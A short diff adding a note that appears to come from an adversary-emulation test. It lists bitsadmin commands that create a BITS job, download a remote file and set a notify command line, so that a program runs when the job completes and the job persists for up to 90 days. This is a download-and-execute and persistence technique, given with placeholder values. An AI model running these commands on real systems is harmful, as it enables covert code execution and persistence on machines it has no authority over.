@@ -1,0 +1,11 @@
+Solution:
+Bitsadmin Job remain for 90 Days if not removed
+Steps:
+
+Execution job:
+	bitsadmin.exe /create #{bits_job_name}
+	bitsadmin.exe /addfile #{bits_job_name} #{remote_file} #{local_file}
+	bitsadmin.exe /setnotifycmdline #{bits_job_name} #{command_path} #{command_line}
+	bitsadmin.exe /complete AtomicBITS
+	bitsadmin.exe /resume #{bits_job_name}
+	
